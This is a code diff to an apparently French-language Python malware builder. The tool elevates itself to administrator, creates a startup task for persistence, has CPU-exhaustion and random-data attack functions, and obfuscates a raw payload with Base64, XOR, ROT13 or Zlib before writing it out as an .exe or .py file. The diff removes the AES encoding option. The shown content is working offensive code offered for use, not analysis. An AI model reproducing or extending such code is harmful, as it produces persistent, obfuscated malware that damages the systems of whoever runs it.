@@ -3,12 +3,11 @@ import sys
 import base64
 import getpass
 import shutil
-import tempfile
 import subprocess
 import time
 from pathlib import Path
-from Crypto.Cipher import AES
-from Crypto.Random import get_random_bytes
+import concurrent.futures
+import secrets
 
 ascii_start = r"""
 ______              ______ ______
@@ -90,7 +89,7 @@ def create_startup_task(script_path):
     try:
         subprocess.run(command, shell=True, check=True)
     except subprocess.CalledProcessError:
-        sys.exit(1) 
+        sys.exit(1)  
 
 
 def generer_donnees_alea(taille_mo):
@@ -112,7 +111,7 @@ def attaque_cpu():
 
 def main():
     if not is_admin():
-        run_as_admin()  # Élever le script si pas administrateur
+        run_as_admin()  
 
     script_path = get_script_path()  
     create_startup_task(script_path)  
@@ -146,11 +145,6 @@ def encode_rot13(payload):
         'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
         'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))
 
-def encode_aes(payload, key):
-    cipher = AES.new(key, AES.MODE_CBC)
-    ct_bytes = cipher.encrypt(payload.encode().ljust(16, b'\0'))
-    return base64.b64encode(cipher.iv + ct_bytes).decode()
-
 def encode_zlib(payload):
     import zlib
     return base64.b64encode(zlib.compress(payload.encode())).decode()
@@ -166,9 +160,6 @@ def generate_file(file_name, extension, encoding_choice):
         encoded_payload = encode_base64(RAW_PAYLOAD)
     elif encoding_choice == 2:
         encoded_payload = encode_xor(RAW_PAYLOAD)
-    elif encoding_choice == 3:
-        key = get_random_bytes(16)
-        encoded_payload = encode_aes(RAW_PAYLOAD, key)
     elif encoding_choice == 4:
         encoded_payload = encode_rot13(RAW_PAYLOAD)
     elif encoding_choice == 5:
@@ -218,12 +209,10 @@ def main():
     print("1. .exe")
     print("2. .py")
     extension_choice = input("Entrez le numéro de l'extension : ")
-    encoding_choice = int(input("Choisissez un encodage :\n1. Base64\n2. XOR\n3. AES\n4. ROT13\n5. Zlib\nEntrez le numéro de l'encodage : "))
+    encoding_choice = int(input("Choisissez un encodage :\n1. Base64\n2. XOR\n4. ROT13\n5. Zlib\nEntrez le numéro de l'encodage : "))
     extension_map = { "1": ".exe", "2": ".py" }
     selected_extension = extension_map.get(extension_choice, ".py")
     generate_file(file_name, selected_extension, encoding_choice)
 
 if __name__ == "__main__":
     main()
-
-
